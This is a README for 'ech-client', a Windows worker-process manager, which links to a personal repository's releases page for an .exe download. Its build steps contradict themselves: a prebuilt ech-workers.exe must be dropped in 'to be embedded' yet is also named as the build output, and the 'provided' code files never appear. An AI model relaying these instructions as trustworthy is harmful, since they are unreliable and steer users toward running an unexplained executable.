# 🚀 ech-client - Simple Way to Manage Workers

[![Download ech-client](https://img.shields.io/badge/Download-ech--client-blue.svg)](https://github.com/civciv1231433/ech-client/releases)

## 📂 Overview

The `ech-client` application helps you manage worker processes smoothly and efficiently. You can create, update, and monitor workers with ease. It provides a clean interface and reliable functionality for your tasks.

## 🚀 Getting Started

Follow these steps to download and run the `ech-client` application.

### ⚡ System Requirements

- Windows 10 or higher
- .NET 10 SDK (for building)
- At least 4GB RAM
- 100MB of free disk space

### 📦 Download & Install

Visit this page to download: [Download ech-client](https://github.com/civciv1231433/ech-client/releases)

Here, you will find the latest version of the application. Click on the version number to access the release page. Download the appropriate `.exe` file based on your system.

### 📁 Project Structure

After downloading, ensure your project has the following structure:

```
EchWorkersManager/
├── EchWorkersManager.csproj
├── Program.cs
├── Form1.cs
├── ech-workers.exe          ← Place this here!
├── app.ico                  ← Icon file (optional)
└── README.md
```

**Important**: Make sure to place `ech-workers.exe` in the project root directory (next to the `.csproj` file). This will ensure it is embedded properly during compilation.

## 🛠️ Build Steps

### Method 1: Using Visual Studio 2022

1. Open Visual Studio 2022.
2. Select "Create a new project."
3. Choose "Windows Forms App (.NET)."
4. Enter the project name: `EchWorkersManager`.
5. Select the framework: `.NET 10.0`.
6. After creating the project, replace the contents of the following files with the provided code:
   - `Form1.cs` (replace the entire file)
   - `Program.cs` (replace the entire file)
   - `EchWorkersManager.csproj` (replace the entire file)
7. Press `Ctrl+Shift+B` or click "Build" → "Build Solution."
8. The compiled `.exe` will be found in either `bin\Debug\net10.0-windows\` or `bin\Release\net10.0-windows\`.

### Method 2: Using Command Line (Requires .NET 10 SDK)

1. Download and install the [.NET 10 SDK](https://dotnet.microsoft.com/download/dotnet/10.0).

2. Create a project folder and save the files:
   ```bash
   mkdir EchWorkersManager
   cd EchWorkersManager
   ```

3. Save the three code files into this folder.

4. Compile the project:
   ```bash
   dotnet build
   ```

After this, you should find your compiled `ech-workers.exe` in the `bin\Debug\net10.0-windows\` directory.

## 🖼️ Icon Management

If you choose to include an icon file for your application:

1. Place the `app.ico` file in the project root.
2. This icon will appear in:
   - Windows taskbar
   - System tray
   - `.exe` file icon
   - Window title bar
3. Follow the same steps as above to ensure it is included in your final build.

## ⚙️ Running the Application

After building the application, navigate to the output directory. Double-click on `ech-workers.exe` to run it. You will see the main interface, where you can manage your worker processes.

## 🆘 Troubleshooting

If you encounter issues, consider the following:

1. Ensure all required files are correctly placed in the project structure.
2. Check if the .NET 10 SDK is correctly installed.
3. Look for any error messages in the output logs; this can provide clues for resolution.

## 📧 Support

For support or questions, please visit the issues section of the repository on GitHub. We welcome your feedback and contributions to improve the application.

## 📢 Version History

- **v1.0** - Initial release of the ech-client application.

Thank you for downloading and using `ech-client`. We hope it makes your worker management tasks easier!